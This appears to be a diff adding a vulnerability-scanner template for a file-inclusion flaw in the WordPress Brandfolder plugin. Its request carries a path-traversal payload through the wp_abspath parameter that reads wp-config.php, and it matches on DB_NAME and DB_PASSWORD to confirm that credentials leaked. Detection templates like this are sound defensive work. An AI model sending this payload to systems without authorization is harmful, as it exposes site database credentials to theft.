@@ -1,0 +1,28 @@
+id: brandfolder-lfi
+brief:
+    title: Wordpress Brandfolder - Remote/Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: WordPress Brandfolder allows remote attackers to access arbitrary files that reside on the local and remote server and disclose their content.
+    label:
+        - lfi
+        - rfi
+        - edb
+        - wordpress
+        - wp-plugin
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00'
+      signs:
+        - "on": word
+          has:
+            - DB_NAME
+            - DB_PASSWORD
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
